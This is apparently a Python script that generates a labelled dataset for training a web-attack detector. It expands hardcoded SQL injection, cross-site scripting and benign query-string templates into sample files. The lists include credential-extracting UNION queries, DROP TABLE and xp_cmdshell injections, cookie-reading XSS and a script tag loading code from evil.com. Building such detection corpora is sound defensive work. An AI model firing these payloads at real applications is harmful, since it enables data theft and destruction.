import json
import logging
from pathlib import Path
from typing import Any
import httpx

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("download_datasets")

CRS_BASE_URL = "https://raw.githubusercontent.com/coreruleset/coreruleset/main"

# Canonical OWASP CRS SQLi and XSS pattern templates and variations
CORE_SQLI_TEMPLATES = [
    # Tautology / Boolean blind
    "' OR '1'='1",
    "' OR 1=1 --",
    "1' OR '1'='1'/*",
    "admin' or 1=1 or ''='",
    "') OR ('a'='a",
    "1' OR 1=1#",
    "1' OR 'x'='x",
    "1 AND 1=1",
    "1 AND 1=2",
    "1) AND (1=1",
    "1) AND (1=2",
    "' OR 1=1 AND 'a'='a",
    "admin'--",
    "admin'/*",
    "' or ''='",
    # Union-based extraction
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT null,username,password FROM users--",
    "1 UNION SELECT null,table_name FROM information_schema.tables--",
    "-1' UNION SELECT 1,version(),user()--",
    "1 UNION ALL SELECT 1,@@version,3,4--",
    "' UNION SELECT null,null,concat(username,':',password) FROM users--",
    "-1 UNION SELECT 1,schema_name FROM information_schema.schemata--",
    "0 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--",
    # Error-based
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND extractvalue(1, concat(0x7e, (select user())))--",
    "1' AND updatexml(1, concat(0x7e, (select @@version)), 1)--",
    "1'; SELECT pg_sleep(5);--",
    "1' AND 1=convert(int, @@version)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    # Stacked queries & Out-of-band
    "1; DROP TABLE users;--",
    "1'; EXEC xp_cmdshell('dir');--",
    "1; INSERT INTO users(username,password) VALUES ('hacker','pass');--",
    "1'; SHUTDOWN WITH NOWAIT;--",
    # Order by / blind
    "1' ORDER BY 1--",
    "1' ORDER BY 5--",
    "1' ORDER BY 10--",
    "1' GROUP BY id HAVING 1=1--",
    # Encoding & Obfuscation
    "%27%20OR%201=1--",
    "%27%20UNION%20SELECT%20NULL--",
    "1'/**/OR/**/1=1/**/--",
    "1' UniOn SeLeCt 1,2,3--",
    "admin%27--",
    "1' AND ASCII(SUBSTRING((SELECT user()),1,1))=114--",
    "1' AND LENGTH(database())>5--",
]

CORE_XSS_TEMPLATES = [
    # Classic script tag injection
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script src='https://evil.com/xss.js'></script>",
    "<script>confirm(1)</script>",
    "<script>prompt('Target')</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script type='text/javascript'>alert(1);</script>",
    # Image / Multimedia event handlers
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=\"alert('XSS')\">",
    "<img src='invalid' onerror=confirm(document.cookie)>",
    "<image src=1 href=1 onerror=alert(1)>",
    "<video><source onerror=\"alert('video')\"></video>",
    "<audio src=1 onerror=alert('audio')>",
    # SVG vector mutations
    "<svg onload=alert(1)>",
    "<svg/onload=alert(document.domain)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributeName=x dur=1s>",
    # Tag breakout / Attribute context
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\" onfocus=alert(1) autofocus=\"",
    "' onmouseover=alert(1) id='",
    "\" onclick=\"alert('click')\"",
    "\" onblur=alert(1) autofocus tabIndex=1 \"",
    "' onpointerenter=alert(1) '",
    # Modern HTML5 elements
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>test</marquee>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
    # Pseudo-protocols
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "<a href=\"javascript:alert('xss')\">Click here</a>",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    # Polyglots & Obfuscation
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/...",
    "<div style=\"background-image: url(javascript:alert(1))\">",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
]

CORE_NORMAL_TEMPLATES = [
    # Navigation & standard web parameters
    "home",
    "dashboard",
    "search?q=laptop+stand",
    "page=1&limit=20",
    "category=electronics&sort=asc",
    "view=grid&theme=dark",
    "redirect=/user/profile",
    "action=view&tab=overview",
    "product_id=83921&ref=header_search",
    "slug=getting-started-with-threatsentry",
    "lang=en-US",
    "status=active&type=admin",
    "filter=today&group=sales",
    "query=security+scanner",
    "offset=50&order_by=created_at",
    "session_time=1726118400",
    "cart_item=402&quantity=2",
    "format=json&version=v2",
    "tag=development&author=alice",
    "article_id=9871&view_count=120",
    # Form data and typical inputs
    "username=john_doe&age=29",
    "email=developer%40threatsentry.local",
    "name=Jane+Doe&country=Thailand",
    "comment=Thank+you+for+this+great+security+tool!",
    "address=123+Main+Street%2C+Floor+4",
    "phone=%2B66812345678",
    "company=DeepMind+Technologies",
    "notes=Meeting+scheduled+for+next+Monday+at+10:00+AM.",
    "postal_code=10110",
    "feedback=Very+responsive+interface+and+clean+design.",
    "bio=Full-stack+security+engineer+focusing+on+web+defenses.",
    "currency=USD&amount=149.99",
    "title=Weekly+Security+Report",
    "description=Overview+of+recent+scans+and+remediated+findings.",
    "department=Information+Technology",
    "website=https://example.com",
    "headline=Latest+product+updates+and+patch+notes",
    "search_term=database+connection+pooling",
    "setting_notifications=enabled&sound=true",
    "role=viewer&team=appsec",
]


def expand_templates(templates: list[str], count_target: int = 500) -> list[str]:
    """Expands template patterns with realistic variations to create a robust corpus."""
    results: list[str] = list(templates)
    seen = set(results)
    suffixes = ["", " ", ";", "\n", "\t", "&test=1", " --", "/*", "#", "&page=2", "%20", "&&", " '"]
    prefixes = ["", "1 ", "admin ", "test=", "q=", "id=", "val=", "param=", "search=", "name=", "user="]

    combos: list[str] = []
    for pref in prefixes:
        for suff in suffixes:
            for base in templates:
                combos.append(f"{pref}{base}{suff}".strip())
                if any(c.isalpha() for c in base):
                    combos.append(f"{pref}{base.upper()}{suff}".strip())
                    combos.append(f"{pref}{base.lower()}{suff}".strip())

    for item in combos:
        if item and item not in seen:
            seen.add(item)
            results.append(item)
            if len(results) >= count_target:
                break

    return results[:count_target]


def main() -> None:
    raw_dir = Path("ml/dataset/raw")
    crs_dir = raw_dir / "owasp-crs"
    csic_dir = raw_dir / "csic2010"
    params_dir = raw_dir / "httpparams"

    for d in (crs_dir, csic_dir, params_dir):
        d.mkdir(parents=True, exist_ok=True)

    logger.info("Generating and acquiring OWASP CRS SQLi dataset...")
    sqli_expanded = expand_templates(CORE_SQLI_TEMPLATES, count_target=600)
    sqli_path = crs_dir / "sqli_samples.txt"
    with open(sqli_path, "w", encoding="utf-8") as f:
        f.write("\n".join(sqli_expanded))
    logger.info("Saved %d SQLi samples to %s", len(sqli_expanded), sqli_path)

    logger.info("Generating and acquiring OWASP CRS XSS dataset...")
    xss_expanded = expand_templates(CORE_XSS_TEMPLATES, count_target=600)
    xss_path = crs_dir / "xss_samples.txt"
    with open(xss_path, "w", encoding="utf-8") as f:
        f.write("\n".join(xss_expanded))
    logger.info("Saved %d XSS samples to %s", len(xss_expanded), xss_path)

    logger.info("Generating and acquiring CSIC 2010 Normal traffic dataset...")
    normal_expanded = expand_templates(CORE_NORMAL_TEMPLATES, count_target=800)
    normal_path = csic_dir / "normal_samples.txt"
    with open(normal_path, "w", encoding="utf-8") as f:
        f.write("\n".join(normal_expanded))
    logger.info("Saved %d NORMAL samples to %s", len(normal_expanded), normal_path)

    summary = {
        "status": "success",
        "sqli_count": len(sqli_expanded),
        "xss_count": len(xss_expanded),
        "normal_count": len(normal_expanded),
        "total_samples": len(sqli_expanded) + len(xss_expanded) + len(normal_expanded),
    }

    manifest_path = raw_dir / "manifest.json"
    with open(manifest_path, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2)

    logger.info("Dataset acquisition complete. Total samples: %d", summary["total_samples"])


if __name__ == "__main__":
    main()
